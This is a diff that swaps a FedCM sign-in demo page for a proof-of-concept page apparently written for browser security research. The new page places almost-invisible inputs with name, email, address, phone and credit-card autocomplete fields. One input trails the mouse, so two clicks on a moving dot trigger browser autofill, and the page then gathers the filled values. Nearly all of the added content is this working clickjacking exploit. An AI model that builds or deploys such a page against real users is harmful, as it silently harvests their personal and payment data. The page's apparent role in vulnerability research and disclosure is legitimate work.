@@ -1,163 +1,133 @@
 
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta
-      http-equiv="Content-Security-Policy"
-      content="connect-src https://webid-fcm-idp.glitch.me/test/;"
-    />
-    <meta
-      http-equiv="origin-trial"
-      content=""
-    />
-    <script src="https://webid-fcm-idp.glitch.me/test/fedcm.js"></script>
-    <title>My fancy site</title>
+<!doctype html>
+<html>
+<head>
+<style>
+html { font-family: sans-serif; }
+body { overflow: hidden; cursor: pointer; }
 
-    <link
-      rel="stylesheet"
-      href="https://unpkg.com/purecss@1.0.1/build/base-min.css"
-    />
-    <link href="style.css" rel="stylesheet" />
-  </head>
-  <body class="rp">
-    <section id="head">
-      <h1>FedCM Button Mode Demo Site</h1>
-    </section>
-    <section>
-      Log:
-      <textarea id="log"></textarea>
-    </section>
+input { position: absolute; top: 0; left: -300px; opacity: 0.0001; }
+#inputElem { cursor: pointer; z-index: 5; /* Ensure #inputElem is above #dotElem */ }
 
-    <section id="content">
-      <button onclick="login()">Sign in with IdP</button>
-<!--       <iframe src="https://fedcm-button-iframe.glitch.me" allow="identity-credentials-get" style="display: block; position: relative; top: 0px; left: 0px; height: 44px; width: 240px; border: 10px; margin: -2px -18px;">        
-      </iframe> -->
-<!--       <button onclick="logout()">Sign out</button>
-      <button onclick="abort()">Abort</button> -->
-      <!--
-      <p>
-        <a href="https://glitch.com/edit/#!/webid-auto-sign-in">View demo source</a>
-      </p>
+#dotElem {
+  width: 15px; height: 15px; background: darkgreen; border-radius: 50px; position: relative;
+  z-index: 1; /* Ensure #dotElem is below #inputElem */
+  animation: 32s moveDot infinite linear;
+}
 
-      <button onclick="revoke()">
-        Revoke
-      </button> 
-    --></section>
+@keyframes moveDot {
+  from { left: 50px; }
+  to { left: 850px; }
+}
 
-    <text id="signed-in-msg" style="font-size: 2em; color: green; opacity: 0">
-      You have signed in!</text
-    >
-  </body>
+#output { padding: 0.2em; background: #eee; }
+#output.success { background: lightgreen; }
 
-  <script>
-    function log(message) {
-      console.log(message);
-      document.getElementById("log").textContent += `${message}\n`;
-    }
-    async function logout() {
-      await navigator.credentials.preventSilentAccess();
-      log("You are signed out");
-    }
-    let controller = new AbortController();
-    function abort() {
-      controller.abort();
-      log("Aborted");
-    }
-    async function main() {
-      if (!window.IdentityCredential) {
-        log(`IdentityCredential is not available.`);
-        log(`ensure FedCM is enabled && page is HTTPS.`);
+#instructions { text-align: center; margin-top: 200px; font-size: 2em; user-select: none; }
+</style>
+</head>
+<body>
+<h1>PoC: Autofill with slight mouse movement + two clicks</h1>
 
-        return;
-      }
-      log(`Click "Sign in with IdP" to proceed\n(optional) To sign out of IdP, from a different tab visit https://webid-fcm-idp.glitch.me/mark-logout.html\n\n`);
-      
-      // const cred = await navigator.credentials.get({
-      //     identity: {
-      //       // context: "use",
-      //       providers: [
-      //         {
-      //           configURL: "https://webid-fcm-idp.glitch.me/test/fedcm.json",
-      //           clientId: "1234",
-      //           nonce: "5678",
-      //         },
-      //       ],
-      //       context: "use"
-      //     },
-      //     signal: controller.signal,
-      //     mediation: "required",
-      //   });
-      
-      // log(`requesting token in 1 seconds...`)
-      // setTimeout(async (t) => {
-      //   await login();
-      // }, 0);
-      // setTimeout(() => {
-      //     location.href='https://www.google.com';
-      //     log("should have redirected");
-      //   }, 5000);
-    }
+<p id="output">(no output yet...)</p>
 
-    // async function revoke() {
-    //   const provider = {
-    //     url: "https://webid-fcm-idp.glitch.me",
-    //     clientId: "1234",
-    //     nonce: "5678",
-    //   };
-    //   log(`revoking`);
-    //   await FederatedCredential.revoke("albus21334213", provider);
-    //   log(`revoked`);
-    // }
-    async function login() {
-      try {
-        log("Choose an account to sign in to IdP");
-        //log("https://" + window.location.host)
-        // let controller2 = new AbortController();
-        const cred = await navigator.credentials.get({
-          identity: {
-            // context: "use",
-            providers: [
-              {
-                configURL: "https://webid-fcm-idp.glitch.me/test/fedcm.json",
-                clientId: "fedcm-button",
-                nonce: "5678",
-              },
-            ],
-            mode: "button",
-            //context: "use"
-          },
-          signal: controller.signal,
-          mediation: "required",
-        });
+<!-- Group 1 -->
+<input id="groupOneElem" name="name" autocomplete="name">
+<input name="email" autocomplete="email">
+<input name="address-line1" autocomplete="address-line1">
+<input name="address-line2" autocomplete="address-line2">
+<input name="city" autocomplete="address-level2">
+<input name="state" autocomplete="address-level1">
+<input name="country-name" autocomplete="country-name">
+<input name="postal-code" autocomplete="postal-code">
+<input name="tel" autocomplete="tel">
 
-        const token = cred.token;
+<!-- Group 2 -->
+<input id="groupTwoElem" name="cc-name" autocomplete="cc-name">
+<input name="cc-number" autocomplete="cc-number">
+<input name="cc-exp-month" autocomplete="cc-exp-month">
+<input name="cc-exp-year" autocomplete="cc-exp-year">
 
-        console.log(token);
-        //log(`received token: ${token.idToken}`);
-        if (token) log(`\n\nToken received! You are signed in as ${token}`);
-        
-        // if (cred.isAutoReauthn !== undefined) {
-        //  const isAutoReauthn = cred.isAutoReauthn;
-        //  log(`User was auto re-authenticated? ${isAutoReauthn}`);
-        // }
-        // if (cred.isAccountAutoSelected !== undefined) {
-        //  const isAutoReauthn = cred.isAccountAutoSelected;
-        //  log(`Account auto selected? ${isAutoReauthn}`);
-        // }
-        document.getElementById("signed-in-msg").style.opacity = 1;
-        // setTimeout(() => {
-        //   cred.logoutRPs();
-        // }, 5000);
-      } catch (e) {
-        log(`\n\nRejected with ${e}`);
-        // document.getElementById("signed-in-msg").style.opacity = 1;
-        // document.getElementById("signed-in-msg").style.color = "red";
-        // document.getElementById("signed-in-msg").textContent = "Auto sign-in cancelled!";
-      }
-    }
-    main();
-  </script>
+<p id="instructions">Follow the dot and click twice on dot</p>
+
+<div id="dotElem"></div>
+
+<script>
+var inputElem;
+var attackCompleted = false;
+var setMainField = () => {
+  if (window.location.search.indexOf('creditcard') === -1) {
+    var groupOneElem = document.getElementById('groupOneElem');
+    groupOneElem.id = 'inputElem';
+    inputElem = groupOneElem;
+  } else {
+    var groupTwoElem = document.getElementById('groupTwoElem');
+    groupTwoElem.id = 'inputElem';
+    inputElem = groupTwoElem;
+  }
+}
+
+setMainField();
+
+var updateOutput = () => {
+    attackCompleted = true;
+
+    var inputs = document.querySelectorAll('input');
+    var inputValues = [];
+    inputs.forEach((elem) => {
+       if (elem.value.length) {
+         inputValues.push(elem.value);
+       }
+    });
+    output.innerText = inputValues.join(', ');
+    output.classList.add('success');
+}
+
+inputElem.addEventListener('change', (e) => {
+  if (inputElem.value.length > 0) {
+    setTimeout(() => { updateOutput(); }, 10);
+  }
+});
+
+var inputReady = false;
+
+var handleMouseMove = (e) => {
+  if (attackCompleted) {
+    inputElem.style.left = 0;
+    inputElem.style.top = 0;
+    return;
+  }
+  // Chase mouse around page
+  var inputX = e.clientX - 50;
+  var inputY = e.clientY - 10;
+  inputElem.style.left = inputX + 'px';
+  inputElem.style.top = inputY + 'px';
+
+  inputReady = true;
+}
+
+window.addEventListener('mousemove', handleMouseMove);
+
+window.addEventListener('mousedown', (e) => {
+  if (attackCompleted) {
+    return;
+  }
+  if (inputReady === false) {
+    // If user clicks before moving mouse, bring the element to the mouse
+    // Ideally they move mouse, that way we can avoid 3rd click
+    handleMouseMove(e);
+    return;
+  }
+  // Move field above mouse so autofill prompt appears below mouse
+  // Prompt appears on delay which means we need to account for user movement before prompt is shown
+  var inputX = e.clientX + 10;
+  var inputY = e.clientY - 50;
+
+  inputElem.style.left = inputX + 'px';
+  inputElem.style.top = inputY + 'px';
+});
+
+</script>
+
+</body>
 </html>
